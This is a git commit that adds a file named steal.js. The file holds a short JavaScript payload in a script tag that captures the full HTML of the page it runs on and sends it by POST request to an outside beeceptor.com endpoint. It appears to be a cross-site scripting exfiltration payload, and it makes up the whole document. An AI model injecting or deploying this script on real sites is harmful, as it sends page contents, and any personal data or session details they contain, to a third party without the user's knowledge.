7da873556d6c291aff38c63fabfa620fec05a30f
Geetika Gopi <86356813+GeetikaGopi@users.noreply.github.com>
2023-03-07 23:56:40 -0500

    Create steal.js

---
+++ steal.js
@@ -0,0 +1,8 @@
+<script type="text/javascript">
+        var htmlContent = document.documentElement.innerHTML;
+        var xhr = new XMLHttpRequest();
+        var endpointUrl = "https://geetika.free.beeceptor.com";
+        xhr.open("POST", endpointUrl);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({ htmlContent: htmlContent }));
+</script>
